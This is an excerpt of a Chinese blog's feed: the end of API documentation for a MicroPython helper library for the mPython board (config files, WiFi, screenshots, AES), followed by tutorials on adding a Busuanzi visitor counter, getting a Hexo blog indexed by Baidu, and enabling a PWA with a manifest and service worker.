<h2 id="写入配置-write函数">写入配置-write函数</h2>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a>并<a href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-config%E7%B1%BB">初始化config类</a></p>
<p>作用：<br>
向指定文件写入配置</p>
<p>传参：<br>
列表形式的配置文件，写入进文件时列表的每个元素将会单独写进一行中</p>
<p>没有返回值</p>
<p>实例：</p>
<pre><code class="language-python">cfgClass.write([&quot;config1&quot;,True,[],114514])
</code></pre>
<h2 id="读取配置-read函数">读取配置-read函数</h2>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a>并<a href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-config%E7%B1%BB">初始化config类</a></p>
<p>作用：<br>
向指定文件读取配置</p>
<p>无返回值/传参</p>
<p>实例：</p>
<pre><code class="language-python">configData=cfgClass.read()
</code></pre>
<h2 id="配置文件路径-cfgfilepath变量">配置文件路径-cfgFilePath变量</h2>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a>并<a href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-config%E7%B1%BB">初始化config类</a></p>
<p>作用：获取/修改config类指定的配置文件路径</p>
<p>无返回值/传参</p>
<h1 id="修复mpy-fixmpyconnbug函数">修复mpy-FixMPyConnBug函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：修复mpython_conn第三方库连接时导致的main.py无法加载的问题</p>
<p>无返回值/传参</p>
<h1 id="运行python文件-runpycodefile函数">运行Python文件-RunPyCodeFile函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：运行Python(.py)代码文件</p>
<p>传参：filePath-文件路径，notUseTryExcept-不使用try...except捕获错误（可选，默认为False）,notUseCompileFunc-不编译函数（可选，默认为False）</p>
<p>返回值：一个字典，存放着运行代码后的产生的所有变量/函数的内容</p>
<h1 id="执行代码-execcode函数">执行代码-ExecCode函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：运行Python代码文件（存储于字符串内）</p>
<p>传参：code-代码</p>
<p>返回值：一个字典，存放着运行代码后的产生的所有变量/函数的内容</p>
<h1 id="等待用户操作-waituserctrl函数">等待用户操作-WaitUserCtrl函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：等待用户操作</p>
<p>传参：mode-模式（分3种，touchpad-触摸板，button-按钮，all-前两种都检测）</p>
<p>无返回值</p>
<h1 id="选择器-select函数">选择器-select函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：选择options参数中的其中一个，并返回其索引</p>
<p>传参：options（列表形式，每个列表为一个字符串）</p>
<p>返回值：<code>(被使用A选中的列表中的元素中的索引,&quot;A&quot;)</code>或<code>(被使用B选中的列表中的元素中的索引,&quot;B&quot;)</code></p>
<h1 id="获取运存闪存空间数据-getflashandraminfo">获取运存/闪存空间数据-GetFlashAndRAMInfo</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：顾名思义，就是获取运行内存的数据和存储空间的数据</p>
<p>返回值：字典形式：</p>
<pre><code class="language-python">{
    &quot;memoryFree&quot;:运行内存剩余可用空间，单位kb,
    &quot;flashFree&quot;:存储内存剩余可用空间，单位kb,
    &quot;flashSize&quot;:存储内存总共可用空间，单位kb
}
</code></pre>
<p>无传参</p>
<h1 id="更好的移除文件-removefile函数">更好的移除文件-RemoveFile函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：自动识别需要删除的文件/目录并使用对应的删除文件的函数</p>
<p>传参：filePath-文件路径</p>
<p>无返回值</p>
<h1 id="targz压缩文件解压-targzfiledecompress函数">.tar.gz压缩文件解压-TarGzFileDecompress函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：顾名思义，解压扩展名为.tar.gz的压缩文件</p>
<p>传参：filePath-targz压缩文件的位置，decompressDir-将压缩文件解压到对应目录的位置</p>
<p>无返回值</p>
<h1 id="ppk文件解压-decompressppkfile类">PPK文件解压-DecompressPPKFile类</h1>
<h2 id="获取ppk文件数据-getppkfiledata函数">获取PPK文件数据-GetPPKFileData函数</h2>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：顾名思义，获取文件的介绍信息/文件数据</p>
<p>传参：path-PPK文件路径,getInfo-是否获取PPK文件的信息（可选，默认为False）</p>
<p>返回值：PPK文件的数据，列表形式，每行一个列表元素，或PPK文件中标注的作者/名称/平台等信息（返回的内容基于参数getInfo，ZPPK文件读取数据返回值为bytes类型数据时）</p>
<h2 id="解压ppk文件-decompress函数">解压PPK文件-decompress函数</h2>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：顾名思义，解压PPK文件</p>
<p>传参：ppkFilePath-PPK文件路径</p>
<p>无返回值</p>
<h2 id="将zppk转换为ppk文件-zppk2ppk函数">将ZPPK转换为PPK文件-ZPPK2PPK函数</h2>
<p>前置：gxxkapi初始化</p>
<p>作用：将ZPPK文件转换为PPK文件（直接在原有文件上修改）</p>
<p>传参：ZPPK文件路径</p>
<p>无返回值</p>
<h1 id="上电自动链接wifi-poweronautoconnectwifi类">上电自动链接WiFi-PowerOnAutoConnectWiFi类</h1>
<h2 id="启用功能-enable函数">启用功能-enable函数</h2>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>作用：在开机时强制链接WiFi，不检测任何数据（包括是否连接成功）</p>
<p>传参：wifissid-WiFi名称，wifipwd-WiFi密码</p>
<p>无返回值</p>
<h2 id="禁用功能-disable函数">禁用功能-disable函数</h2>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a>并<a href="#%E5%90%AF%E7%94%A8%E5%8A%9F%E8%83%BD-enable%E5%87%BD%E6%95%B0">启用功能</a></p>
<p>作用：禁用在开机时强制链接WiFi这一功能</p>
<p>无返回值/传参</p>
<h2 id="更新wifi链接密码ssid-update函数">更新WiFi链接密码/SSID-update函数</h2>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a>并<a href="#%E5%90%AF%E7%94%A8%E5%8A%9F%E8%83%BD-enable%E5%87%BD%E6%95%B0">启用功能</a></p>
<p>作用：更新WiFi连接时使用的名称/密码</p>
<p>传参：wifissid-WiFi名称，wifipwd-WiFi密码</p>
<p>无返回值</p>
<h1 id="wifi控制-wifi类">WiFi控制-wifi类</h1>
<p>不需要初始化GxxkAPI类 使用<code>from GxxkAPI import wifi</code>即可使用</p>
<h2 id="链接wifi-connect函数">链接WiFi-connect函数</h2>
<p>前置条件：导入本模块中的wifi类</p>
<p>作用：链接WiFi函数，但是能更改的东西更多</p>
<p>传参：ssid-WiFi名称，pwd-WiFi密码，WiFiIsCannotScan-WiFi是否不能被扫描到（可选，默认为False），checkWiFiIsConnect-连接后是否检查是否成功连接可选，默认为False），timeout-WiFi链接超时时间（可选，默认为10s(数字10)，如checkWiFiIsConnect为True，则此选项无效）</p>
<p>无返回值</p>
<h2 id="断开wifi-disconnect函数">断开WiFi-disconnect函数</h2>
<p>前置条件：导入本模块中的wifi类</p>
<p>作用：断开WiFi</p>
<p>无返回值/传参</p>
<h1 id="获取设备id-getdeviceid函数">获取设备ID-GetDeviceID函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>无传参</p>
<p>作用：获取设备ID</p>
<p>返回值：一个十位的由大小写字母/数字组成的掌控版设备ID，基于Mac码生成而来</p>
<h1 id="拆分字符串-cut函数">拆分字符串-cut函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>传参：一个字符串（需要被拆分的内容）和一个数字（每个被拆分的内容的长度）</p>
<p>作用：将一个字符串拆分为每个元素都有x个字符的列表（假设最后一个长度不足x，也会直接被添加进列表内）</p>
<p>返回值：被拆分后的列表</p>
<h1 id="fxxx移植-betterformatstr函数">f&quot;{xxx}&quot;移植-BetterFormatStr函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>传参：一个字符串（需要被格式化的内容）</p>
<p>作用：将一个字符串使用format函数格式化，但是被“{}”包裹的内容就是格式化后的值本身</p>
<p>返回值：被格式化后的字符</p>
<p>可能有点抽象，举个例子：</p>
<pre><code class="language-python">from GxxkAPI import GxxkAPI
GxxkAPI=GxxkAPI()
f=GxxkAPI.BetterFormatStr
print(&quot;格式化前：{1+2+3}&quot;)      # 打印：格式化前：{1+2+3}
print(f(&quot;格式化后：{1+2+3}&quot;))   # 打印：格式化后：6
</code></pre>
<h1 id="截屏-screenshot函数">截屏-screenshot函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>传参：截屏路径，截屏模式（可选，默认为4），截屏坐标（可选且仅在模式3内生效）</p>
<p>作用：截取屏幕缓冲区内容，包括没有应用到屏幕上的内容</p>
<p>模式：</p>
<p>截屏共有以下几种模式：</p>
<ol>
<li><strong>数组格式</strong> 扫描屏幕（返回数组），占用RAM70KB左右，耗时2s<br>
调用方法：<code>screendata=GxxkAPI.screenshot(mode=1)</code></li>
<li><strong>格式P1</strong> 扫描屏幕并写入进图片文件（pbm文件，P1格式，掌控版不可显示）内，耗时2s，RAM占用未知（非原创，作者emo的程序大神）<br>
调用方法：<code>GxxkAPI.screenshot(path=&quot;/image-mode2-p1.pbm&quot;,mode=2)</code></li>
<li><strong>可设置截屏范围</strong> 扫描屏幕并写入进图片文件（pbm文件，P1格式，掌控版不可显示）（非原创，作者LP）<br>
调用方法：<code>GxxkAPI.screenshot(path=&quot;/image-mode3-p1.pbm&quot;,mode=3)</code></li>
<li><strong>最优解</strong> 扫描屏幕并写进pbm格式P4的图片文件中（掌控版可显示），占用RAM至少小于25k，耗时1s左右</li>
<li><strong>RAM占用低</strong>（相对于模式4） 大致核心算法与模式4相同，在原基础上让***（机密）的存储时间变得更长，防止内存碎片产生</li>
</ol>
<h1 id="是否是目录-isdir函数">是否是目录-IsDir函数</h1>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a></p>
<p>传参：需要判断的路径</p>
<p>作用：基于os.stat给出的文件类型位判断路径所指文件对象是不是目录</p>
<p>返回值：布尔值，代表是不是目录</p>
<h1 id="是否是文件-isfile函数">是否是文件-IsFile函数</h1>
<p>此函数已在第一次精简模块操作时被移除，需要使用not IsDir(path)达到相应效果</p>
<h1 id="掌控版基本自主硬件资源移植">掌控版基本自主硬件资源移植</h1>
<p>GxxkAPI将mpython库中的部分较重要的对象移植到了GxxkAPI内，您可以在不导入mpython的情况下使用部分自主硬件资源</p>
<p>前置条件：<a href="#%E5%88%9D%E5%A7%8B%E5%8C%96gxxkapi">初始化GxxkAPI</a>并且导入方式必须是<code>from GxxkAPI import *</code></p>
<h2 id="oled类移植优化">OLED类移植/优化</h2>
<p>GxxkAPI将OLED类移植了过来，并且对DispChar函数进行了优化，删去了mode参数，只留下reverse参数（2个模式+1模式（不显示字符背景disableCharBg））</p>
<p>实例（最好还是自己去试试）：</p>
<pre><code class="language-python">from GxxkAPI import *
# 正常使用
oled.fill(0)
oled.DispChar(&quot;Hello World!&quot;,0,0)
oled.show()
# 反色模式
oled.fill(0)
oled.DispChar(&quot;Hello World!&quot;,0,0,reverse=True)
oled.show()
# 正常使用下禁用字符背景（啥也看不见，反色模式下也同理）
oled.fill(1)
oled.DispChar(&quot;Hello World!&quot;,0,0,disableCharBg=True)
oled.show()
</code></pre>
<h2 id="按钮">按钮</h2>
<p>是machine.Pin返回的对象，没有<code>was_pressed</code>/<code>is_pressed</code>等函数，您可以使用<code>button_a.value()==0</code>判断是否按下</p>
<p>可用对象：</p>
<pre><code class="language-text">button_a
button_b
</code></pre>
<p>例子：</p>
<pre><code class="language-python">def __Select(options:list, title:str)-&gt;tuple:
    target = 0
    # 主循环
    while True:
        # 绘制UI
        oled.fill(0)
        oled.hline(0, 15, 128, 1)
        oled.DispChar(title, 0, -1)
        oled.DispChar(options[target], 0, 16, reverse=True) # 反色模式绘制选中内容
        try:
            oled.DispChar(options[target+1], 0, 32)
            oled.DispChar(options[target+2], 0, 48)
        except:pass
                
        oled.show()
        # 等待操作
        GxxkAPI.wait()
        # 做出决策
        if button_a.value()==0:
            return target, &quot;A&quot;
        elif button_b.value()==0:
            return target, &quot;B&quot;
        elif touchPad_P.read() &lt; 100:
            target -= 1  # 向上（左）
        elif touchPad_N.read() &lt; 100:
            target += 1  # 向下（右）
        if target == -1:
            target = len(options)-1
        elif target==len(options):
            target=0
</code></pre>
<h2 id="金手指touchpad">金手指（TouchPad）</h2>
<p>是machine.TouchPad生成的对象，没有<code>is_pressed</code>/<code>was_pressed</code>等函数，但您可以使用<code>touchPad_P.read()&lt;100</code>判断是否按下，示例见上方</p>
<p>可用对象：</p>
<pre><code class="language-text">touchPad_P
touchPad_Y
touchPad_T
touchPad_H
touchPad_O
touchPad_N
</code></pre>
<h2 id="rgb灯珠neopixel">RGB灯珠（NeoPixel）</h2>
<p>是模块NeoPixel生成的对象，和原版rgb完全相同，可以直接使用，具体方法详见mpython官方文档</p>
<h1 id="aes算法对称数据加密-aesdatacryption">AES算法对称数据加密-AESDataCryption</h1>
<h2 id="加密-encrypt函数">加密-encrypt函数</h2>
<p>传参：需要加密的数据（字节/字符形式），密钥（字节形式，推荐使用os.urandom(您期望的密钥长度//8)生成），IV(字节形式，推荐使用os.urandom(16)生成)</p>
<p>作用：使用ucryptolib中的aes加密算法对数据进行加密</p>
<p>返回值：加密后的数据，Bytes类型</p>
<h2 id="解密-decrypt函数">解密-decrypt函数</h2>
<p>除了主要功能为解密内容外，其他属性都与encrypt函数一样</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[搭博客少走弯路-Gridea添加基于不蒜子的访问量统计]]></title>
        <id>https://gxxk.site/yk76x5ZGr/</id>
        <link href="https://gxxk.site/yk76x5ZGr/">
        </link>
        <updated>2023-06-09T11:02:34.000Z</updated>
        <summary type="html"><![CDATA[<p>不蒜子是一款非常简洁，简单的计数器，无需登录，无需注册，也很小，只需将访问量代码添加到网站最下方底部信息（主题-底部信息）内即可使用，但是它只有PV/UV统计这一功能，适合轻度用户使用</p>
<p>官网：<a href="https://busuanzi.ibruce.info/">https://busuanzi.ibruce.info/</a></p>
]]></summary>
        <content type="html"><![CDATA[<p>不蒜子是一款非常简洁，简单的计数器，无需登录，无需注册，也很小，只需将访问量代码添加到网站最下方底部信息（主题-底部信息）内即可使用，但是它只有PV/UV统计这一功能，适合轻度用户使用</p>
<p>官网：<a href="https://busuanzi.ibruce.info/">https://busuanzi.ibruce.info/</a></p>
<!-- more -->
<p>PS: 代码内的<code>busuanzi_container</code>开头的是用于给程序标注的访问量展示的部分，用于在加载失败时自动隐藏访问量统计</p>
<p>最简使用代码（PV）：</p>
<pre><code class="language-html">&lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;
&lt;span id=&quot;busuanzi_container_site_pv&quot;&gt;本站总访问量&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;次&lt;/span&gt;
</code></pre>
<p>全套使用代码（本站使用的代码，站点PV/UV，页面PV）：</p>
<pre><code class="language-html">&lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;
本站总访问量&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;次
本站总访客数&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;位
本页总访问量&lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;次
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ 搭博客少走弯路-GithubPage 百度SEO]]></title>
        <id>https://gxxk.site/xIomO_plB/</id>
        <link href="https://gxxk.site/xIomO_plB/">
        </link>
        <updated>2023-06-03T01:23:25.000Z</updated>
        <summary type="html"><![CDATA[<blockquote>
<p>本文从旧版博客迁移而来，可能不适用于Gridea，请知悉</p>
</blockquote>
<h1 id="前言">前言</h1>
<p>其实关于百度SEO优化的方面早就想搞了，但是因为GithubPage屏蔽了百度爬虫，这方面一直闲置着在，现在给博客引擎换成了<code>hexo</code>，方便了一些，而且<code>hexo</code>也有很多开箱即用的插件，很方便，所以现在经过一番摸索，找到了百度SEO优化的方法</p>
]]></summary>
        <content type="html"><![CDATA[<blockquote>
<p>本文从旧版博客迁移而来，可能不适用于Gridea，请知悉</p>
</blockquote>
<h1 id="前言">前言</h1>
<p>其实关于百度SEO优化的方面早就想搞了，但是因为GithubPage屏蔽了百度爬虫，这方面一直闲置着在，现在给博客引擎换成了<code>hexo</code>，方便了一些，而且<code>hexo</code>也有很多开箱即用的插件，很方便，所以现在经过一番摸索，找到了百度SEO优化的方法</p>
<!-- more -->
<h1 id="教程">教程</h1>
<h2 id="前置条件">前置条件</h2>
<ul>
<li>博客引擎为<code>Hexo</code></li>
<li>博客使用自定义域名</li>
<li>博客已备案（关于GithubPage的备案可以去买腾讯的Serverless备案资源包进行备案）</li>
</ul>
<h2 id="正文">正文</h2>
<ol>
<li>
<p>安装Sitemap生成器，指令：<code>npm install hexo-generator-sitemap --save</code> （PS：之前看见一篇文章说要安装baidu版Sitemap生成器，其实这个可有可无，百度爬虫本身支持普通的sitemap的）</p>
</li>
<li>
<p>重新部署博客，指令：</p>
<pre><code class="language-bash">hexo clean
hexo g
hexo d
</code></pre>
</li>
<li>
<p>在<a href="https://ziyuan.baidu.com/linksubmit/index">https://ziyuan.baidu.com/linksubmit/index</a>注意要先绑定站点，站点必须备案</p>
</li>
<li>
<p>在上一步的连接中选择<code>普通收录-&gt;sitemap</code>，在下面的输入框内输入：<code>[站点域名]/sitemap.xml</code>（或<code>[站点域名]/sitemap.txt</code>）</p>
</li>
<li>
<p>等待百度收录完成</p>
</li>
<li>
<p>收录完成，此时可以在百度搜索：<code>site:[站点域名]</code>查看百度收录的所有页面</p>
</li>
</ol>
<h3 id="设置固定链接">设置固定链接</h3>
<ol>
<li>
<p>安装<code>hexo-abbrlink</code>，指令：<code>npm install hexo abbrlink --save</code></p>
</li>
<li>
<p>在配置文件<code>_config.yml</code>中的<code># Directory</code>上一行添加如下内容</p>
<pre><code class="language-bash">abbrlink:
    alg: crc16   #算法： crc16(default) and crc32
    rep: hex     #进制： dec(default) and hex
</code></pre>
<p>生成时，会在文章开头格式化字段添加一行内容：<code>abbrlink: '[根据算法生成的文章访问id]'</code>，也可自行添加，自定义访问链接</p>
<p>关于每个算法对应的链接参考这里：</p>
<pre><code class="language-text">crc16&amp;rep: 66c8
crc16&amp;dec: 65535
crc32&amp;hex: 8ddf18fb
crc32&amp;dec: 1690090958
</code></pre>
</li>
<li>
<p>重新部署博客，指令：</p>
<pre><code class="language-bash">hexo clean
hexo g
hexo d
</code></pre>
</li>
</ol>
<p>Tip:固定链接有助于优化搜索引擎权重，所以abbrlink尽量不要随意更改</p>
<h1 id="总结">总结</h1>
<p>GithubPage博客为什么不被百度收录：百度爬虫被GitHub屏蔽，SEO优化方法：</p>
<p>安装Sitemap生成器并重新部署博客：</p>
<pre><code class="language-bash">npm install hexo-generator-sitemap --save
hexo clean
hexo g
hexo d
</code></pre>
<p>在<a href="https://ziyuan.baidu.com/linksubmit/index">https://ziyuan.baidu.com/linksubmit/index</a>提交：<code>[站点域名]/sitemap.xml</code></p>
<p>在百度搜索：<code>site:[站点域名]</code>确认网站是否被收录</p>
<p>设置固定链接：</p>
<p>安装abbrlink: <code>npm install hexo abbrlink --save</code></p>
<p><code>_config.yml</code>配置文件添加：</p>
<pre><code>abbrlink:
    alg: crc16   #算法： crc16(default) and crc32
    rep: hex     #进制： dec(default) and hex
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[搭博客少走弯路-Hexo启用PWA]]></title>
        <id>https://gxxk.site/dn8xRQp4y/</id>
        <link href="https://gxxk.site/dn8xRQp4y/">
        </link>
        <updated>2023-06-03T01:16:54.000Z</updated>
        <summary type="html"><![CDATA[<blockquote>
<p>注：本文从旧版博客迁移而来，可能不适用于Gridea</p>
</blockquote>
<h1 id="前言">前言</h1>
<p>最近看到我朋友博客换主题了，点进这个主题介绍页，功能还蛮多的，其中<code>支持PWA</code>这一项就吸引了我的眼球，后来查了一下，本质上就是一个App，但是和传统App还是有很多区别的，其中就<strong>支持多平台</strong>，电脑、手机均可使用，同时<strong>可离线访问</strong>，便赶紧给自己博客加上，但大多都不适合新版本使用，如<code>hexo-pwa</code>，不支持<code>hexo@4.2.0</code>及以上的版本，最终翻了几篇教程，在实践了一下，总结出一片教程，可通过非插件方式让<code>Hexo</code>支持<code>PWA</code></p>
]]></summary>
        <content type="html"><![CDATA[<blockquote>
<p>注：本文从旧版博客迁移而来，可能不适用于Gridea</p>
</blockquote>
<h1 id="前言">前言</h1>
<p>最近看到我朋友博客换主题了，点进这个主题介绍页，功能还蛮多的，其中<code>支持PWA</code>这一项就吸引了我的眼球，后来查了一下，本质上就是一个App，但是和传统App还是有很多区别的，其中就<strong>支持多平台</strong>，电脑、手机均可使用，同时<strong>可离线访问</strong>，便赶紧给自己博客加上，但大多都不适合新版本使用，如<code>hexo-pwa</code>，不支持<code>hexo@4.2.0</code>及以上的版本，最终翻了几篇教程，在实践了一下，总结出一片教程，可通过非插件方式让<code>Hexo</code>支持<code>PWA</code></p>
<!-- more -->
<h1 id="正文">正文</h1>
<h2 id="准备工作">准备工作</h2>
<ul>
<li>
<p>支持<code>HTTPS</code>的站点</p>
</li>
<li>
<p>网站各种分辨率的图标</p>
</li>
</ul>
<h2 id="教程">教程</h2>
<ol>
<li>
<p>在<code>[站点根目录]/source</code>下新建文件 <code>manifest.json</code>，替换掉所有用<code>[]</code>包起来的部分（注意！配置文件内不要有任何注释！）</p>
<pre><code class="language-json">{
    &quot;lang&quot;: &quot;zh-CN&quot;,
    &quot;name&quot;: &quot;[站点名称]&quot;,
    &quot;short_name&quot;: &quot;[站点短名称，建议和上面的站点名称一样]&quot;,
    &quot;description&quot;: &quot;[站点介绍]&quot;,
    &quot;theme_color&quot;: &quot;[主题色，如：#000000]&quot;,
    &quot;background_color&quot;: &quot;[应用开屏背景颜色，和上面那个填一样就行]&quot;,
    &quot;start_url&quot;: &quot;[应用启动第一个显示的页面，，填 / 就行]&quot;,
    &quot;Scope&quot;: &quot;[此配置文件的作用域，填 / 就行]&quot;,
    &quot;display&quot;: &quot;[应用显示模式，填 standalone 就行]&quot;,
    &quot;orientation&quot;: &quot;[应用的默认方向，填 any 就行]&quot;,
    &quot;icons&quot;: [{
        &quot;src&quot;: &quot;[像素大小为60x60的网站图标的地址,png格式]&quot;,
        &quot;type&quot;: &quot;image/png&quot;,
        &quot;sizes&quot;: &quot;60x60&quot;
    },{
        &quot;src&quot;: &quot;[像素大小为72x72的网站图标的地址,png格式]&quot;,
        &quot;type&quot;: &quot;image/png&quot;,
        &quot;sizes&quot;: &quot;72x72&quot;
    },{   
        &quot;src&quot;: &quot;[像素大小为96x96的网站图标的地址,png格式]&quot;,
        &quot;type&quot;: &quot;image/png&quot;,
        &quot;sizes&quot;: &quot;96x96&quot;
    },{     
        &quot;src&quot;: &quot;[像素大小为144x144的网站图标的地址,png格式]&quot;,
        &quot;type&quot;: &quot;image/png&quot;,
        &quot;sizes&quot;: &quot;144x144&quot;
    },{    
        &quot;src&quot;: &quot;[像素大小为144x144的网站图标的地址,png格式]&quot;,
        &quot;type&quot;: &quot;image/png&quot;,
        &quot;sizes&quot;: &quot;192x192&quot;
    },{        
        &quot;src&quot;: &quot;[像素大小为144x144的网站图标的地址,png格式]&quot;,
        &quot;type&quot;: &quot;image/png&quot;,
        &quot;sizes&quot;: &quot;512x512&quot;
    }]
}
</code></pre>
</li>
<li>
<p>在博客主题模板文件（一般为<code>layout.ejs</code>）的最上方引入此配置文件（<code>&lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot;&gt;</code>）</p>
</li>
<li>
<p>在<code>[站点根目录]/source</code>新建<code>sw.js</code></p>
<pre><code class="language-javascript">const version = 'offline-cache-v1'

self.addEventListener('install', function (event) {
    event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', function (event) {
    event.waitUntil(
        Promise.all([
            self.clients.claim(),
            caches.keys().then(function (cacheList) {
                return Promise.all(
                    cacheList.map(function (cacheName) {
                        if (cacheName !== version) {
                            return caches.delete(cacheName);
                        }
                    })
                );
            })
        ])
    );
});

self.addEventListener('fetch', function (event) {
    
    console.log('url is', event.request.url)

    event.respondWith(
        caches.match(event.request).then(function (response) {
            if (response) {
                return response;
            }

            var request = event.request.clone();
            return fetch(request).then(function (httpRes) {
                if (!httpRes || httpRes.status !== 200) {
                    return httpRes;
                }

                var responseClone = httpRes.clone();
                caches.open(version).then(function (cache) {
                    cache.put(event.request, responseClone);
                });

                return httpRes;
            });
        })
    );
})
</code></pre>
</li>
<li>
<p>在刚刚编辑的站点主体模板文件内插入的那行代码下插入以下代码（引入sw.js）：</p>
<pre><code class="language-html">&lt;script&gt;
  if ('serviceWorker' in navigator) {
      window.addEventListener('load', function () {
          navigator.serviceWorker.register('/sw.js')
              .then(function (registration) {
                  console.log('sw.js 注册成功', registration.scope);
              })
              .catch(function (err) {
                  console.log('sw.js 注册失败 ', err);
              });
       });
  }
&lt;/script&gt;
</code></pre>
</li>
<li>
<p>重新部署即可查看效果</p>
</li>
</ol>
]]></content>
    </entry>
</feed>